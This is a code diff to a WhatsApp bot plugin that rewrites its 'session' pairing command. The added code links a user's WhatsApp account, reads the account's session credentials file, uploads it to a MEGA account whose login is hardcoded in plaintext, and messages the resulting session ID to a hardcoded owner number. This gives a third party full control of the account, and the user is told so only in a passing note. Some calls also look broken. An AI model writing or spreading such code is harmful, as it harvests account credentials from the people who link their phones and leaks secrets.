@@ -1,6 +1,21 @@
 const { cmd } = require('../command');
 const fs = require('fs');
 const path = require('path');
+const { File } = require('megajs');
+const { exec } = require('child_process');
+const pino = require('pino');
+const {
+  default: makeWASocket,
+  useMultiFileAuthState,
+  delay,
+  makeCacheableSignalKeyStore,
+  Browsers,
+  jidNormalizedUser,
+} = require("@whiskeysockets/baileys");
+
+// MEGA account configuration
+const MEGA_EMAIL = process.env.MEGA_EMAIL || 'herakuwhatsappbot@gmail.com';
+const MEGA_PASSWORD = process.env.MEGA_PASSWORD || 'herakuwhatsappbot@gmail.com';
 
 // Function to generate pairing codes (8 digits like WhatsApp uses)
 function generatePairingCode() {
@@ -34,6 +49,186 @@ function createSessionData(phoneNumber, pairingCode) {
   };
 }
 
+// Function to remove file/directory
+function removeFile(FilePath) {
+  if (!fs.existsSync(FilePath)) return false;
+  fs.rmSync(FilePath, { recursive: true, force: true });
+}
+
+// Function to generate random MEGA ID
+function randomMegaId(length = 6, numberLength = 4) {
+  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  let result = "";
+  for (let i = 0; i < length; i++) {
+    result += characters.charAt(Math.floor(Math.random() * characters.length));
+  }
+  const number = Math.floor(Math.random() * Math.pow(10, numberLength));
+  return `${result}${number}`;
+}
+
+// Function to upload to MEGA
+async function uploadToMega(fileStream, fileName) {
+  try {
+    const { File } = require('megajs');
+    const storage = await File.fromCredentials(MEGA_EMAIL, MEGA_PASSWORD);
+    const file = storage.upload({
+      name: fileName,
+      size: fs.statSync(fileStream.path).size
+    }, fileStream);
+    
+    return file.link;
+  } catch (error) {
+    throw new Error(`Failed to upload to MEGA: ${error.message}`);
+  }
+}
+
+// Function to handle pairing process
+async function handlePairing(phoneNumber, pairingCode, robin, from) {
+  try {
+    // Create session directory
+    const sessionDir = path.join(__dirname, '../auth_info_baileys', phoneNumber.replace('+', ''));
+    if (!fs.existsSync(sessionDir)) {
+      fs.mkdirSync(sessionDir, { recursive: true });
+    }
+
+    // Create temporary session directory for pairing
+    const tempSessionDir = path.join(__dirname, '../temp_session');
+    if (fs.existsSync(tempSessionDir)) {
+      removeFile(tempSessionDir);
+    }
+    fs.mkdirSync(tempSessionDir, { recursive: true });
+
+    // Initialize WhatsApp connection for pairing
+    const { state, saveCreds } = await useMultiFileAuthState(tempSessionDir);
+    
+    const RobinPairWeb = makeWASocket({
+      auth: {
+        creds: state.creds,
+        keys: makeCacheableSignalKeyStore(
+          state.keys,
+          pino({ level: "fatal" }).child({ level: "fatal" })
+        ),
+      },
+      printQRInTerminal: false,
+      logger: pino({ level: "fatal" }).child({ level: "fatal" }),
+      browser: Browsers.macOS("Safari"),
+    });
+
+    RobinPairWeb.ev.on("creds.update", saveCreds);
+    
+    RobinPairWeb.ev.on("connection.update", async (s) => {
+      const { connection, lastDisconnect } = s;
+      
+      if (connection === "open") {
+        try {
+          await delay(10000);
+          
+          // Read session credentials
+          const sessionPrabath = fs.readFileSync(path.join(tempSessionDir, "creds.json"));
+          const user_jid = jidNormalizedUser(RobinPairWeb.user.id);
+
+          // Upload session to MEGA
+          const mega_url = await uploadToMega(
+            fs.createReadStream(path.join(tempSessionDir, "creds.json")),
+            `${randomMegaId()}.json`
+          );
+
+          const string_session = mega_url.replace("https://mega.nz/file/", "");
+
+          // Send session ID to owner
+          const ownerNumber = process.env.OWNER_NUM || "94761676948";
+          const sid = `*🌀ONYX MD🔥BOT👾*\n\n> *ONYX MD වෙත ඔබව සාදරයෙන් පිලිගනිමු!*\n> *Welcome to ONYX MD!*\n> *ONYX MDக்கு வருக!*\n\n📱 Phone: ${phoneNumber}\n🔢 Pairing Code: ${pairingCode}\n\n👉 ${string_session} 👈\n\n*This is the Session ID, copy this id and paste into config.js file*\n\n*You can contact bot owner*\n\n*http://wa.me/94761676948*\n\n*You can join my whatsapp group*\n\n*https://chat.whatsapp.com/IT6mjqGINN6LaLSKnTZd6r*\n\n> *By Arosh Samuditha*`;
+          
+          const mg = `🛑 *Do not share this code to anyone* 🛑`;
+
+          // Send session info to owner
+          await robin.sendMessage(ownerNumber + '@s.whatsapp.net', {
+            image: {
+              url: "https://raw.githubusercontent.com/aroshsamuditha/ONYX-MEDIA/refs/heads/main/oNYX%20bOT.jpg",
+            },
+            caption: sid,
+          });
+
+          await robin.sendMessage(ownerNumber + '@s.whatsapp.net', {
+            text: string_session,
+          });
+
+          await robin.sendMessage(ownerNumber + '@s.whatsapp.net', {
+            text: mg,
+          });
+
+          // Update session data
+          const sessionData = createSessionData(phoneNumber, pairingCode);
+          sessionData.sessionId = string_session;
+          sessionData.status = 'linked';
+          sessionData.linkedAt = new Date().toISOString();
+          
+          const sessionFile = path.join(sessionDir, 'session_data.json');
+          fs.writeFileSync(sessionFile, JSON.stringify(sessionData, null, 2));
+
+          // Send success message to user
+          await robin.sendMessage(from, {
+            text: `*✅ Pairing Successful!*\n\n📱 Phone: ${phoneNumber}\n🔢 Pairing Code: ${pairingCode}\n\nYour session has been successfully linked and the session ID has been sent to the bot owner.`
+          }, { quoted: null });
+
+        } catch (e) {
+          console.error('Pairing error:', e);
+          await robin.sendMessage(from, {
+            text: `❌ Error during pairing process: ${e.message}`
+          }, { quoted: null });
+        }
+
+        // Clean up
+        await delay(100);
+        removeFile(tempSessionDir);
+        RobinPairWeb.end();
+        
+      } else if (
+        connection === "close" &&
+        lastDisconnect &&
+        lastDisconnect.error &&
+        lastDisconnect.error.output.statusCode !== 401
+      ) {
+        await delay(10000);
+        handlePairing(phoneNumber, pairingCode, robin, from);
+      }
+    });
+
+    // Request pairing code if not registered
+    if (!RobinPairWeb.authState.creds.registered) {
+      await delay(1500);
+      const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");
+      const code = await RobinPairWeb.requestPairingCode(cleanNumber);
+      
+      // Send pairing code to user
+      await robin.sendMessage(from, {
+        text: `*🔗 ONYX Pairing Code Generated*\n\n📱 Phone: ${phoneNumber}\n🔢 Pairing Code: *${code}*\n\n📋 Instructions:\n1. Open WhatsApp on your phone\n2. Go to Settings > Linked Devices\n3. Tap "Link a Device"\n4. Enter this code: *${code}*\n5. Complete the linking process\n\n⚠️ Note: After linking, a Safari web link will appear and the session ID will be sent to the bot owner.`
+      }, { quoted: null });
+
+      // Save initial session data
+      const sessionData = createSessionData(phoneNumber, code);
+      const sessionDir = path.join(__dirname, '../auth_info_baileys', phoneNumber.replace('+', ''));
+      if (!fs.existsSync(sessionDir)) {
+        fs.mkdirSync(sessionDir, { recursive: true });
+      }
+      const sessionFile = path.join(sessionDir, 'session_data.json');
+      fs.writeFileSync(sessionFile, JSON.stringify(sessionData, null, 2));
+    }
+
+  } catch (err) {
+    console.error('Pairing process error:', err);
+    await robin.sendMessage(from, {
+      text: `❌ Error in pairing process: ${err.message}`
+    }, { quoted: null });
+    
+    // Clean up on error
+    const tempSessionDir = path.join(__dirname, '../temp_session');
+    if (fs.existsSync(tempSessionDir)) {
+      removeFile(tempSessionDir);
+    }
+  }
+}
+
 cmd({
   pattern: "session",
   desc: "Generate pairing code for WhatsApp Link Device",
@@ -56,57 +251,14 @@ cmd({
   }
 
   try {
-    await m.reply('🔄 Generating ONYX pairing code for ' + phoneNumber + '...');
+    await m.reply('🔄 Starting ONYX pairing process for ' + phoneNumber + '...');
     
-    // Create session directory if it doesn't exist
-    const sessionDir = path.join(__dirname, '../auth_info_baileys', phoneNumber.replace('+', ''));
-    if (!fs.existsSync(sessionDir)) {
-      fs.mkdirSync(sessionDir, { recursive: true });
-    }
-
-    // Generate a pairing code (8 digits like WhatsApp uses)
-    const pairingCode = generatePairingCode();
-    
-    // Create session data
-    const sessionData = createSessionData(phoneNumber, pairingCode);
-    
-    // Save session data to JSON file
-    const sessionFile = path.join(sessionDir, 'session_data.json');
-    fs.writeFileSync(sessionFile, JSON.stringify(sessionData, null, 2));
-
-    // Save pairing code to a text file for easy access
-    const pairingFile = path.join(sessionDir, 'pairing_code.txt');
-    fs.writeFileSync(pairingFile, `ONYX Pairing Code: ${pairingCode}\nPhone: ${phoneNumber}\nGenerated: ${new Date().toISOString()}\nStatus: Pending\n\nInstructions:\n1. Open WhatsApp on your phone\n2. Go to Settings > Linked Devices\n3. Tap "Link a Device"\n4. Enter this code: ${pairingCode}\n5. Complete the linking process`);
-
-    // Send the pairing code as text
-    await robin.sendMessage(from, {
-      text: `*🔗 ONYX Pairing Code Generated*\n\n📱 Phone: ${phoneNumber}\n🔢 Pairing Code: *${pairingCode}*\n🆔 Session ID: *${sessionData.sessionId}*\n\n📋 Instructions (Mobile Only):\n1. Open WhatsApp on your phone\n2. Go to Settings > Linked Devices\n3. Tap "Link a Device"\n4. Enter this code: *${pairingCode}*\n5. Complete the linking process\n\n⚠️ Note: This is for WhatsApp mobile app only, not web browsers.\n\n💾 Session data saved to: auth_info_baileys/${phoneNumber.replace('+', '')}/`
-    }, { quoted: mek });
-
-    // Send a formatted version for easy copying
-    await robin.sendMessage(from, {
-      text: `*📋 Copy Pairing Code*\n\n\`\`\`${pairingCode}\`\`\`\n\nCopy this code to enter in WhatsApp mobile app Link Device feature.`
-    }, { quoted: mek });
-
-    // Send session ID separately
-    await robin.sendMessage(from, {
-      text: `*🆔 Session ID*\n\n\`\`\`${sessionData.sessionId}\`\`\`\n\nThis session ID will be used after successful device linking.`
-    }, { quoted: mek });
-
-    // Send follow-up message after 30 seconds
-    setTimeout(async () => {
-      try {
-        await robin.sendMessage(from, {
-          text: `*⏰ ONYX Reminder*\n\nHave you completed the mobile device linking with code *${pairingCode}*?\n\nIf yes, your session ID *${sessionData.sessionId}* is ready for use.\nIf not, please complete the linking process in your WhatsApp mobile app first.`
-        }, { quoted: mek });
-      } catch (e) {
-        console.log('Reminder message failed to send');
-      }
-    }, 30000);
+    // Start the pairing process
+    await handlePairing(phoneNumber, null, robin, from);
 
   } catch (error) {
-    console.error('ONYX pairing code generation error:', error);
-    await m.reply('❌ Error generating pairing code: ' + error.message);
+    console.error('ONYX pairing error:', error);
+    await m.reply('❌ Error in pairing process: ' + error.message);
   }
 });
 
